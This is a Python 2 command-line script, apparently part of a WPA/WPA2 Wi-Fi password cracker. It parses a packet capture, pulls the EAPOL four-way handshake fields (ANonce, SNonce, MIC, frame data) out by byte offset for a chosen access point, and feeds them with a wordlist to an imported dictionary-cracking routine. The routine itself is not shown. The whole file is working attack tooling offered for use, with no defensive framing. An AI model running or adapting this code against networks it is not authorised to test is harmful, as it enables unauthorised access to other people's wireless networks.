from pcapParser import load_savefile
from cracker import crack
from multiprocessing import Queue


def crackClients(clients, usersMac, SSID, passphraseQ):
    clientHandshakes = []
    for client in clients:
        handshake = []
        for message in clients[client]:
            if message['message'] == 1:
                handshake = [message]
            elif len(handshake) == 1:
                handshake.append(message)
                clientHandshakes.append(handshake)
                break
            else:
                handshake = []
    for clientHandshake in clientHandshakes:
        if clientHandshake[0]['AP'] == usersMac:
            cracked = crack(SSID, clientHandshake[0]['client'], clientHandshake[0]['AP'], clientHandshake[0]['Anonce'], clientHandshake[1]['Snonce'], clientHandshake[1]['mic'], clientHandshake[1]['data'], passphraseQ)
            if cracked != False:
                return cracked
    return False

if __name__ == "__main__":
    from sys import argv, exit
    import getopt
    try:                  
        opts, args = getopt.getopt(argv[1:], "r:m:s:d:")
    except getopt.GetoptError:          
        print "bad args"
        exit(2)
    for opt, arg in opts:
        if opt == '-r':
            readFile = arg
        if opt == '-m':
            usersMac = arg.replace(":", "").decode('hex')
        if opt == '-s':
            SSID = arg
        if opt == '-d':
            try:
                f = open(arg, 'r')
                passphraseQ = Queue()
                for passphrase in f.read().split('\n'):
                    passphraseQ.put(passphrase)
                f.close()
            except IOError:
                print "Error reading dictionary"
                exit(2)
    print "loading dictionary..."
    try:
        passphraseQ
    except:
        f = open('dictionary.txt', 'r')
        passphraseQ = Queue()
        for passphrase in f.read().split('\n'):
            passphraseQ.put(passphrase)
        f.close()

    try:
        usersMac
        SSID
        readFile
    except NameError:
        print "missing args, requirs: -m (AP mac address) -s (SSID) -r (PCAP filename)"
        exit(2)
    try:
        caps, header = load_savefile(open(readFile))
    except IOError:
        print "Error reading file"
        exit(2)

    if header.ll_type != 1 and header.ll_type != 105:
        print "unsupported linklayer type, only supports ethernet and 802.11"
        exit(2)
    clients = {}
    if header.ll_type == 105:
        for packet in caps.packets:
            auth = packet[1].raw()[32:34]
            if auth == '\x88\x8e':
                AP = packet[1].raw()[16:22]
                dest = packet[1].raw()[4:10]
                source = packet[1].raw()[10:16]
                part = packet[1].raw()[39:41]
                relivent = True
                if part == '\x00\x8a':
                    message = 1
                    client = dest
                    Anonce = packet[1].raw()[51:83]
                    info = {'AP': AP, 'client': client, 'Anonce': Anonce, 'message': message}
                elif part == '\x01\x0a':
                    Snonce = packet[1].raw()[51:83]
                    client = source
                    mic = packet[1].raw()[115:131]
                    data = packet[1].raw()[34:115] + "\x00"*16 + packet[1].raw()[131:]
                    message = 2
                    info = {'AP': AP, 'data': data, 'client': client, 'Snonce': Snonce, 'mic': mic, 'message': message}
                else:
                    relivent = False
                if relivent:
                    if info['client'] in clients:
                        clients[info['client']].append(info)
                    else:
                        clients[info['client']] = [info]
    else:
        for packet in caps.packets:
            auth = packet[1].raw()[12:14]
            if auth == '\x88\x8e':
                relivent = True
                part = packet[1].raw()[19:21]
                if part == '\x00\x8a':
                    message = 1
                    client = packet[1].raw()[0:6]
                    AP = packet[1].raw()[6:12]
                    Anonce = packet[1].raw()[31:63]
                    info = {'AP': AP, 'client': client, 'Anonce': Anonce, 'message': message}
                elif part == '\x01\x0a':
                    Snonce = packet[1].raw()[31:63]
                    AP = packet[1].raw()[0:6]
                    client = packet[1].raw()[6:12]
                    mic = packet[1].raw()[95:111]
                    data = packet[1].raw()[14:95] + "\x00"*16 + packet[1].raw()[111:]
                    message = 2
                    info = {'AP': AP, 'data': data, 'client': client, 'Snonce': Snonce, 'mic': mic, 'message': message}
                else:
                    relivent = False
                if relivent:
                    if info['client'] in clients:
                        clients[info['client']].append(info)
                    else:
                        clients[info['client']] = [info]
    cracked = crackClients(clients, usersMac, SSID, passphraseQ)
    if cracked == False:
        print "Unable to find passphrase"
    else:
        print "Passphrase found! " + cracked

